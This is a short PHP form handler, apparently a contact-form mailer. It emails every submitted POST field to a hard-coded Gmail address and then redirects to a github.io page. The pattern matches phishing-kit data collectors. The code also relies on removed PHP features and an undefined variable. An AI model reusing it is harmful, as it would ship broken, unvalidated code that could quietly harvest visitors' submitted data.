<?php
$TO = "mbouzalfan@gmail.com";

$h = "From: " . $TO;

$message = "";

while (list($key, $val) = each($HTTP_POST_VARS)) {
$message .= "$key : $val\n";
}

mail($TO, $subject, $message, $h);

Header("Location: http://miloud47.github.io/Phyzical_aid/");

?>